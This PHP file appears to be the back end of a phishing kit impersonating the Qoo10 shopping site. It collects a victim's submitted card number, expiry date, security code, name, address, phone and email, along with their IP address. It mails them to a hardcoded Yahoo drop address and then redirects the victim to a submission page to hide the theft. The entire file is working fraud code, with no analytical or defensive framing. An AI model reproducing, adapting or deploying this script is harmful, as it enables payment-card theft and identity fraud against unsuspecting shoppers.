<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Card Number               : ".$_POST['cardNumber']."\n";
$bilsmg .= "|Expiration MM/YY -----: ".$_POST['dateM']."<br>\n";
$bilsmg .= "Security code              : ".$_POST['cvv2']."\n";
$bilsmg .= "First name              : ".$_POST['cardHolderF']."\n";
$bilsmg .= "Last name              : ".$_POST['cardHolderL']."\n";
$bilsmg .= "Street               : ".$_POST['street']."\n";
$bilsmg .= "State               : ".$_POST['state']."\n";
$bilsmg .= "ZIP               : ".$_POST['zip']."\n";
$bilsmg .= "City               : ".$_POST['city']."\n";
$bilsmg .= "Phone               : ".$_POST['phone']."\n";
$bilsmg .= "Email               : ".$_POST['email']."\n";
$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "hasilpenampungan@yahoo.com";
$bilsub = "Qoo10 CARD | From $ip";
$bilhead = "From:Qoo10 MALL CARD <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../submission.html";
header("location:$src");
?>
?>